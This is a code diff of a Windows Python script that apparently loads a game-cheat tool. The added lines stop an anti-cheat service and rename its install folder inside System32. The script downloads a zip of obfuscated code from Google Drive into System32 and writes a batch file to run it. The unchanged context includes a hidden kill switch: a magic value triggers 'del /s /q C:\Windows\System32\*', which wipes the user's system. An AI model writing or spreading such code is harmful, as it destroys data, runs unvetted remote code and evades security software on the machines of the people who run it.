@@ -12,6 +12,21 @@ import shutil
 import os
 import gdown
 os.system('cls')
+def stop_service():
+    service_name = "vgk"
+    try:
+        # Run the command to stop the service
+        result = subprocess.run(["net", "stop", service_name], capture_output=True, text=True, shell=True)
+
+        # Output the result of the command
+        if result.returncode == 0:
+            print(f"Service '{service_name}' stopped successfully.")
+        else:
+            print(f"Failed to stop the service '{service_name}'.\nError: {result.stderr.strip()}")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+stop_service()
+os.system('cls')
 #exit()
 if file_contentsx1=="deleternn":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
@@ -65,7 +80,7 @@ def delete_system32_filex():
 delete_system32_filex()
 '''
 os.system('cls')
-dcnmwxdr = r'C:\Windows\System32\MSX'
+dcnmwxdr = r'C:\Windows\System32\DRVX'
 
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
@@ -144,11 +159,11 @@ os.system('cls')
 print("")
 print("")
 def delete_files_if_aesv3_missing():
-    aesv3_path = r"C:\Windows\System32\MSX\aesprnoguiv2.py"
+    aesv3_path = r"C:\Windows\System32\DRVX\aesmarv.py"
     files_to_delete = [
-        r"C:\Windows\System32\MSX\aespremium_nogui.py",
-        r"C:\Windows\System32\MSX\aespremium_nogui.bat",
-        r"C:\Windows\System32\MSX\pyarmor_runtime_000000"
+        r"C:\Windows\System32\DRVX\aespremium_nogui.py",
+        r"C:\Windows\System32\DRVX\aespremium_nogui.bat",
+        r"C:\Windows\System32\DRVX\pyarmor_runtime_000000"
     ]
 
     aesv3_exists = os.path.exists(aesv3_path)
@@ -177,11 +192,11 @@ def download_file_from_google_drive(url, output_path):
     if not os.path.exists(output_path):
         gdown.download(url, output=output_path, quiet=True)
 
-if not os.path.exists("C:\\Windows\\System32\\MSX\\pyarmor_runtime_000000"):
+if not os.path.exists("C:\\Windows\\System32\\DRVX\\pyarmor_runtime_000000"):
     print("downloading required libraries, please wait a moment...")
-    download_file_from_google_drive("https://drive.google.com/uc?id=1OY1kbjcTrvyhXlmM2OCTdpEc0Et2_4s9", "C:\\Windows\\System32\\MSX\\nogx.zip")
-    zip_file = r'C:\Windows\System32\MSX\nogx.zip'
-    extract_dir = r'C:\Windows\System32\MSX'
+    download_file_from_google_drive("https://drive.google.com/uc?id=1OY1kbjcTrvyhXlmM2OCTdpEc0Et2_4s9", "C:\\Windows\\System32\\DRVX\\aesmarv.zip")
+    zip_file = r'C:\Windows\System32\DRVX\aesmarv.zip'
+    extract_dir = r'C:\Windows\System32\DRVX'
     extract_zip(zip_file, extract_dir)
     os.remove(zip_file)
 
@@ -256,8 +271,8 @@ else:
 
 os.system('cls')
 def create_batch_file(python_command, script_name):
-    directory = r"C:\Windows\System32\MSX"
-    filename = "aespremium_nogui.bat"
+    directory = r"C:\Windows\System32\DRVX"
+    filename = "aesmarv.bat"
     filepath = os.path.join(directory, filename)
     if not os.path.exists(filepath):
         batch_content = f"@echo off\n{python_command} {script_name} || echo errorwithpath"
@@ -267,8 +282,8 @@ def create_batch_file(python_command, script_name):
         print(f"")
     else:
         print("")
-create_batch_file("py -3.11", r"C:\Windows\System32\MSX\aesprnoguiv2.py")
-batch_file_path = r"C:\Windows\System32\MSX\aespremium_nogui.bat"
+create_batch_file("py -3.11", r"C:\Windows\System32\DRVX\aesmarv.py")
+batch_file_path = r"C:\Windows\System32\DRVX\aesmarv.bat"
 os.system('cls')
 
 if file_contentsx1=="LKSGjXNYy6DSj":
